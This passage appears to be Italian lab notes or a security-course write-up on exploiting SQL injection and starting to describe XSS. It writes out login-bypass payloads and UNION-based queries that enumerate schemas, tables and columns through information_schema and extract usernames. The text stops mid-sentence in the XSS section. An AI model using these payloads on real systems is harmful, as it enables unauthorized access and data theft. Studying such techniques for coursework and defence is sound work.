2. Da ciò si evince che è possibile sfruttare una vulnerabilità nota: sql injection, la quale 
consentirà di inserire codice SQL malevolo (non sanitizzato) in un campo di input per manipolare 
a nostro piacimento le query al database ed ottenere dati sensibli.

	- L'idea è sfruttare l'input dell'utente per modificare la query SQL in modo che la condizione risulti sempre vera:
	
	1. Esempio di Query Vulnerabile: `SELECT * FROM users WHERE username = 'user' AND password = 'password'`;
	Se l'input dell'utente per il campo username è: `' OR 1=1 --`, oppure `' OR '1' = '1`

	2.La query diventa: `SELECT * FROM users WHERE username = '' OR 1=1 --' AND password = 'password'`;
	OR 1=1: forza la condizione ad essere sempre vera.
	--: commenta il resto della query, ignorando la verifica della password
	
	
	- L'idea è di sfruttare l'operatore UNION per combinare il risultato di una query legittima con dati 
	estratti da altre tabelle del database (a tale scopo sono particolarmente rilevanti le tabelle
	che contengono informazioni sulla struttura del database, cone information_schema in mysql)

	1. La prima fase è scoprire il numero di colonne iniettando diverse query con NULL.
	Se dà errore, significa che il numero di colonne specificato non corrisponde a quello 
	atteso dalla query originale. Provo ad iniettare un solo NULL, vedendo l'output cosa restituisce:
	
		-`' UNION SELECT NULL #` oppure `' UNION SELECT NULL --`, dipende dalla versione di sql 
	
	Dà errore, bisogna provare con più colonne.
	
	2. Dopo diversi tentativi scopro che con la seguente query non viene restituito errore:
	
		-`' UNION SELECT NULL, NULL, NULL #`
	
	Da ciò si deduce che il numero di colonne è esattamente 3
	
	3. Inietto le seguenti query per poter rispettivamente:

		- Scoprire gli Schemi: `' UNION SELECT NULL, NULL, schema_name FROM information_schema.schemata #`
		- Scoprire le Tabelle: `' UNION SELECT NULL, NULL, table_name FROM information_schema.tables #`
		- Scoprire le Tabelle di uno Specifico Schema:`' UNION SELECT NULL, NULL, table_name FROM information_schema.tables WHERE table_schema = 'unibo' #`
		- Scoprire le Colonne di una Specifica Tabella:`' UNION SELECT NULL, NULL, column_name FROM information_schema.columns WHERE table_name = 'users' #`
	
	4. Ne consegue che è possibile recuperare i dati della tabella "users" in questo modo:

		- `' UNION SELECT NULL, NULL, username FROM users #`

2. Da ciò si evince che è possibile sfruttare una vulnerabilità nota: XSS, la quale consente di iniettare codice JavaScript
malevolo in una pagina web che, se non viene correttamente filtrato, verrà eseguito. I tipi principali di XSS sono:

	- Stored XSS: il codice è salvato nel database e viene mostrato a ogni utente che visualizzerà quella entry
	- Reflected XSS: il codice è passato direttamente nell'URL e viene riflesso nella risposta
	- DOM-based XSS: il codice è eseguito nel browser, manipolando direttamente il DOM

Esso, anche se è effettivamente codice eseguito unicamente lato client, rappresenta una minaccia in quanto può consentire 
ad un attaccante di rubare cookie di sessione, eseguire azioni al posto dell’utente, effettuare redirect verso siti malevoli,
